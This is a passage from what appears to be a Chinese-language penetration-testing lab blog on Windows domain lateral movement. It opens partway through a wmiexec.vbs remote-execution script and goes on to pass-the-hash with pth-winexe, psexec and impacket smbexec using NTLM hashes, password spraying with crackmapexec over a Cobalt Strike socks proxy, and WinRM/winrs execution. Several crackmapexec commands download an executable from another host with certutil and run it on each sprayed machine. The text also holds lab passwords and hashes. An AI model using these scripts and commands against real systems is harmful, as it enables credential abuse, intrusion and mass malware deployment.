PhraseCmd(cmd)</span><br><span class="line">	PhraseCmd = <span class="literal">False</span> <span class="comment">&#x27; not &#x27;cd&#x27;</span></span><br><span class="line">	arrCommand = <span class="built_in">Split</span>(cmd)</span><br><span class="line">	strExe = arrCommand(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">If</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(strExe)) = <span class="string">&quot;cd&quot;</span> <span class="keyword">Or</span> <span class="built_in">LCase</span>(<span class="built_in">Trim</span>(strExe)) = <span class="string">&quot;cd.exe&quot;</span> <span class="keyword">Then</span> PhraseCmd = <span class="string">&quot;cd&quot;</span>  <span class="comment">&#x27; is &#x27;cd&#x27;</span></span><br><span class="line">	<span class="keyword">Set</span> regEx = <span class="keyword">New</span> RegExp</span><br><span class="line">	regEx.Pattern = <span class="string">&quot;^[a-z]:$&quot;</span></span><br><span class="line">	regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line">	<span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> PhraseCmd = <span class="string">&quot;cd&quot;</span> <span class="comment">&#x27; is &#x27;d:&#x27;</span></span><br><span class="line">	<span class="comment">&#x27;phrase time command</span></span><br><span class="line">	regEx.Pattern = <span class="string">&quot;(.*?)-wait(\d+)&quot;</span></span><br><span class="line">	regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line">	<span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">		<span class="keyword">Set</span> objMatch = Matches(<span class="number">0</span>)</span><br><span class="line">		command = objMatch.SubMatches(<span class="number">0</span>)</span><br><span class="line">		<span class="comment">&#x27;WScript.Echo &quot;Command :&quot; &amp; command</span></span><br><span class="line">		WAITTIME = <span class="built_in">CInt</span>(objMatch.SubMatches(<span class="number">1</span>))</span><br><span class="line">		WScript.Echo <span class="string">&quot;WMIEXEC : Waiting &quot;</span> &amp; WAITTIME &amp; <span class="string">&quot; ms...&quot;</span> &amp; vbNewLine</span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	<span class="comment">&#x27;phrase persist command</span></span><br><span class="line">	regEx.Pattern = <span class="string">&quot;(.*?)-persist&quot;</span></span><br><span class="line">	regEx.IgnoreCase = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">Set</span> Matches = regEx.<span class="keyword">Execute</span>(cmd)</span><br><span class="line">	<span class="keyword">If</span> Matches.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">		<span class="keyword">Set</span> objMatch = Matches(<span class="number">0</span>)</span><br><span class="line">		command = objMatch.SubMatches(<span class="number">0</span>)</span><br><span class="line">		PhraseCmd = <span class="string">&quot;persist&quot;</span>  <span class="comment">&#x27; is quiet</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> CreateShare()</span><br><span class="line">	<span class="comment">&#x27;create share</span></span><br><span class="line">	<span class="keyword">Set</span> objNewShare = objWMIService.<span class="keyword">Get</span>(<span class="string">&quot;Win32_Share&quot;</span>)</span><br><span class="line">	intReturn = objNewShare.Create _</span><br><span class="line">	    (FilePath, <span class="string">&quot;WMI_SHARE&quot;</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share could not be created.&quot;</span> &amp; _</span><br><span class="line">	        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">	    <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">9</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Invalid File Path!&quot;</span></span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">22</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share Name Already In Used!&quot;</span></span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">24</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Directory NOT exists!&quot;</span></span><br><span class="line">	    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line">		<span class="keyword">If</span> intReturn &lt;&gt; <span class="number">22</span> <span class="keyword">Then</span> WScript.Quit</span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">	    WScript.Echo <span class="string">&quot;WMIEXEC : Share created sucess.&quot;</span></span><br><span class="line">		WScript.Echo <span class="string">&quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;</span></span><br><span class="line">		WScript.Echo <span class="string">&quot;WMIEXEC : Share Path -&gt; &quot;</span> &amp; FilePath</span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> DeleteShare()</span><br><span class="line">	<span class="keyword">Set</span> colShares = objWMIService.ExecQuery _</span><br><span class="line">		(<span class="string">&quot;Select * from Win32_Share Where Name = &#x27;WMI_SHARE&#x27;&quot;</span>)</span><br><span class="line">	<span class="keyword">For</span> <span class="keyword">Each</span> objShare <span class="keyword">In</span> colShares</span><br><span class="line">		intReturn = objShare.Delete</span><br><span class="line">	<span class="keyword">Next</span></span><br><span class="line">	<span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Delete Share failed.&quot;</span> &amp; _</span><br><span class="line">	        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">	    <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">25</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share Not Exists!&quot;</span></span><br><span class="line">	    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">	    WScript.Echo <span class="string">&quot;WMIEXEC : Share deleted sucess.&quot;</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Exec(cmd, file)</span><br><span class="line">	<span class="keyword">Set</span> objStartup = objWMIService.<span class="keyword">Get</span>(<span class="string">&quot;Win32_ProcessStartup&quot;</span>)</span><br><span class="line">	<span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</span><br><span class="line">	objConfig.ShowWindow = <span class="number">12</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">Set</span> objProcess=objWMIService.<span class="keyword">get</span>(<span class="string">&quot;Win32_Process&quot;</span>)</span><br><span class="line">	strExec = <span class="string">&quot;cmd.exe /c &quot;</span> &amp; cmd &amp; <span class="string">&quot; &gt; &quot;</span> &amp; file &amp; <span class="string">&quot; 2&gt;&amp;1&quot;</span>  <span class="comment">&#x27;2&gt;&amp;1 err</span></span><br><span class="line">	<span class="keyword">If</span> boolPersist <span class="keyword">Then</span></span><br><span class="line">		strExec = cmd</span><br><span class="line">		intPath = <span class="built_in">InStr</span>(cmd,<span class="string">&quot;\&quot;</span>)</span><br><span class="line">		<span class="keyword">If</span> intPath = <span class="number">0</span> <span class="keyword">Then</span> strExec = CurrentFolder &amp; <span class="string">&quot;\&quot;</span> &amp; strExec</span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	<span class="comment">&#x27;WScript.Echo strExec</span></span><br><span class="line">	intReturn = objProcess.Create _</span><br><span class="line">	    (strExec, CurrentFolder, objConfig, intProcessID)  <span class="comment">&#x27;Add CurrentFolder (strExec, Null, objConfig, intProcessID)</span></span><br><span class="line">	<span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Process could not be created.&quot;</span> &amp; _</span><br><span class="line">	        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Command -&gt; &quot;</span> &amp; cmd &amp; _</span><br><span class="line">	        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">	    <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">			<span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">				WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Insufficient Privilege!&quot;</span></span><br><span class="line">	    	<span class="keyword">Case</span> <span class="number">9</span></span><br><span class="line">	    		WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Path Not Found!&quot;</span></span><br><span class="line">	    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line"><span class="comment">&#x27;	    WScript.Echo &quot;Process created.&quot; &amp; _</span></span><br><span class="line"><span class="comment">&#x27;	        vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _</span></span><br><span class="line"><span class="comment">&#x27;	        vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID</span></span><br><span class="line">		<span class="keyword">If</span> boolPersist <span class="keyword">Then</span> WScript.Echo <span class="string">&quot;WMIEXEC : Process created. PID: &quot;</span>&amp; intProcessID</span><br><span class="line">	    <span class="keyword">If</span> boolGetFolder = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">	    	boolGetFolder = <span class="literal">False</span></span><br><span class="line">	    	Exec = GetCurrentFolder()</span><br><span class="line">	    	<span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">	    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	    <span class="comment">&#x27;ReadResult()</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> ReadResult()</span><br><span class="line">	WScript.Sleep(WAITTIME)</span><br><span class="line">	UNCFilePath = <span class="string">&quot;\\&quot;</span> &amp; host &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="string">&quot;WMI_SHARE&quot;</span> &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">	<span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">	<span class="keyword">Set</span> objFile = fso.OpenTextFile(UNCFilePath, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">If</span> <span class="keyword">Not</span> objFile.AtEndOfStream <span class="keyword">Then</span> strContents = objFile.ReadAll</span><br><span class="line">	objFile.Close</span><br><span class="line">	WScript.Echo strContents</span><br><span class="line">	<span class="comment">&#x27;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder</span></span><br><span class="line">	strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">	Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> GetCurrentFolder()</span><br><span class="line">	WScript.Sleep(WAITTIME)</span><br><span class="line">	UNCFilePath = <span class="string">&quot;\\&quot;</span> &amp; host &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="string">&quot;WMI_SHARE&quot;</span> &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">	<span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">	<span class="keyword">Set</span> objFile = fso.OpenTextFile(UNCFilePath, <span class="number">1</span>)</span><br><span class="line">	GetCurrentFolder = objFile.ReadLine</span><br><span class="line">	objFile.Close</span><br><span class="line">	strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">	Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>



<p>把脚本上传到目标服务器</p>
<p><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709336104d7b.png" alt="image-20240914132534035"></p>
<p>可以看到会生成一个交互式shell 且与3.21(DC)交互</p>
<p><strong>有一个问题就是CS不支持交互式shell</strong></p>
<p>所以这个脚本利用面比较窄</p>
<h3 id="kali自带pth执行"><a href="#kali自带pth执行" class="headerlink" title="kali自带pth执行"></a>kali自带pth执行</h3><p>工作组环境下（本地管理员）：</p>
<p><code>pth-winexe  -U administrator%Aatest --system --ostype=1 //192.168.3.90 cmd</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933be25b92.png" alt="image-20240914133847869"></p>
<p>域环境下（域管用户）：</p>
<p><code>pth-winexe  -U ggyao/administrator%Aatest --system --ostype=1 //192.168.3.90 cmd</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933bdc64a1.png" alt="image-20240914133930069"></p>
<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>SMB是文件共享服务 通过<strong>445端口</strong>进行的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b33a8d4.png" alt="image-20240918182113450"></p>
<p>可以直接用CS的端口扫描看下445端口开没开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b324fcb.png" alt="image-20240918182221751"></p>
<p>同样 它也是支持hash和明文传递的</p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>PsExec是微软官方提供的一个Windows远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性</p>
<p>PsExec的原理是通过SMB连接到服务端的<code>Admin$</code>共享，并释放名为”psexecsvc.exe”的二进制文件，然后注册名为”PSEXECSVC”服务。当客户端执行命令时，服务端通过PSEXECSVC服务启动相应的程序执行命令并回显数据。运行结束后，PSEXECSVC服务会被删除。</p>
<p>使用PSEXEC进行远程操作需要以下条件：</p>
<p>1、远程主机开启了<code>Admin$</code>共享</p>
<p>2、远程主机未开启防火墙或放行了<strong>445端口</strong></p>
<p>用微软自带工具 可以绕过免杀</p>
<p>PStools</p>
<p>直接到微软官网上去下就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b32235e.png" alt="image-20240918182618330"></p>
<p>因为它也是shell的形式</p>
<p>用CS不太行</p>
<p>所以我们用socks节点打过去</p>
<p><code>psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b8a4a3f.png" alt="image-20240918183243824"></p>
<h3 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b323eee.png" alt="image-20240918184038910"></p>
<p><code>psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</code></p>
<p><code>psexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.32</code></p>
<p>还是走socks代理比较好</p>
<p>我这里好像代理一直有点问题</p>
<p>一直拒绝访问</p>
<p>但是命令是没问题的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b59e65a.png" alt="image-20240918184234171"></p>
<p>呃 又好了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933c2b42ac.png" alt="image-20240918184436101"></p>
<h3 id="SMBexec"><a href="#SMBexec" class="headerlink" title="SMBexec"></a>SMBexec</h3><p>同样是用impacket中的来</p>
<p>里面有一个SMBexec</p>
<p><code>smbexec ./administrator:admin!@#45@192.168.3.32</code></p>
<p><code>smbexec god/administrator:Admin12345@192.168.3.32</code></p>
<p><code>smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</code></p>
<p><code>smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</code></p>
<p><code>smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933c1b1e7b.png" alt="image-20240918185242679"></p>
<p><strong>只要能执行命令，那么就可以通过下载执行木马的形式执行对应的木马</strong></p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>尝试使用已经获取的hash已经明文密码，对于域内所有主机进行相应的登录尝试 这就是密码喷洒</p>
<p>工具：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">crackmapexec</a></p>
<p>下载命令</p>
<p><code>apt-get install crackmapexec</code></p>
<h3 id="linux代理"><a href="#linux代理" class="headerlink" title="linux代理"></a>linux代理</h3><p>需要下载proxychain</p>
<p><code>apt install proxychains</code> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933c3dc42b.png" alt="image-20240918190902840"></p>
<p>好 然后我们需要配置一下</p>
<p><code>proxychains ping www.baidu.com</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933c287b43.png" alt="image-20240918191139602"></p>
<p>找到配置文件地址</p>
<p>&#x2F;etc&#x2F;proxychains.conf</p>
<p>编辑</p>
<p><code>vi /etc/proxychains.conf</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b49bfab.png" alt="image-20240918191400753"></p>
<p>这里是127.0.0.1是因为我们CS服务端在本地</p>
<p>而win下的配置是我kali的IP</p>
<p>我们把它的端口改成CS的socks代理的端口</p>
<p>然后就可以来下载crackmapexec</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933c480ab4.png" alt="image-20240918194113112"></p>
<p>crackmapexec -h</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933c32d6d5.png" alt="image-20240918194600320"></p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="密码喷洒域登录"><a href="#密码喷洒域登录" class="headerlink" title="密码喷洒域登录"></a>密码喷洒域登录</h4><p><code>crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39;</code></p>
<p>但是我们不能直接在kali上用</p>
<p>因为kali和域内主机不在同网段连不上</p>
<p>所以我们必须用socks代理</p>
<p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39;</code></p>
<p>这样就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933bfb4c5e.png" alt="image-20240918202254922"></p>
<p>登不上去</p>
<h4 id="本地登录"><a href="#本地登录" class="headerlink" title="本地登录"></a>本地登录</h4><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; --local-auth</code></p>
<p>多了一个–local-auth</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b68324f.png" alt="image-20240918202202687"></p>
<p>登录成功会有这个绿色的+</p>
<h4 id="本地登录执行命令"><a href="#本地登录执行命令" class="headerlink" title="本地登录执行命令"></a>本地登录执行命令</h4><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; -x &#39;whoami&#39; --local-auth</code></p>
<p>多了一个<code>-x &#39;whoami&#39;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b5420d5.png" alt="image-20240918202508005"></p>
<p>他会在最后把所以能执行命令的主机的执行结果汇总</p>
<p><strong>本地登录命令执行上线</strong></p>
<p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; -x &#39;certutil -urlcache -split -f http://192.168.3.31/xxx.exe &amp; c:/4455.exe&#39; --local-auth</code></p>
<p>就是把whoami改成一个下载命令再执行</p>
<p>也可进行爆破</p>
<p>就是把-u 和-p后面跟上字典就像</p>
<p><strong>密码喷洒域登录命令执行上线</strong></p>
<p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; -x &#39;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#39;</code></p>
<p>少了一个–local-auth</p>
<p><strong>密码喷洒本地&amp;域登录命令执行全自动上线：</strong></p>
<p>域</p>
<p><code>proxychains crackmapexec smb 192.168.3.21-32 -u user.txt -p pass.txt -x &#39;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#39;</code></p>
<p>本地</p>
<p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt -x &#39;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#39; --local-auth</code></p>
<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。</p>
<p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP&#x2F;S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP<strong>端口5985</strong>进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p>
<p><strong>WinRM: windows远程管理，是一种允许管理员远程执行系统管理任务的服务</strong></p>
<blockquote>
<p>2008 以上  默认是自动   Win7以上手动启动</p>
<p>win 2012  默认都是允许远程任意主机进行管理</p>
</blockquote>
<p>查询本机的WinRM状态:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>开启WinRM服务:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q    #自动添加防火墙例外规则，放行5985端口。</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>



<p>扫描一下5985端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b5f0f1e.png" alt="image-20240925232433383"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b3bed06.png" alt="image-20240925232538267"></p>
<p>也就是DC、webserver、sqlserver三台主机开了5985端口</p>
<p>Windows远程管理工具提供了两个命令行工具用于远程管理</p>
<ul>
<li><p>Winrs，允许远程执行命令的命令行工具，利用WS-Management协议</p>
</li>
<li><p>Winrm(Winrm.cmd),内置系统管理命令行工具，允许管理员配置本机的WinRM服务</p>
</li>
</ul>
<h3 id="Winrs"><a href="#Winrs" class="headerlink" title="Winrs"></a>Winrs</h3><p>所以执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami</span><br><span class="line"></span><br><span class="line">winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami</span><br></pre></td></tr></table></figure>

<p>咦 CS报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b2af196.png" alt="image-20240925233032029"></p>
<p>排查了很久</p>
<p>感觉可能是shell的问题 </p>
<p>但是在主机内是可以执行的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b336af0.png" alt="image-20240925233129350"></p>
<p>那我们用cmd就行</p>
<p>也就是cs转给msf</p>
<p>在msf里shell</p>
<p>然后运行cmd </p>
<p>在cmd里执行命令就行</p>
<p>既然可以执行任意命令 那么我们就可以让他远程下载木马并执行 这样就可以上线了</p>
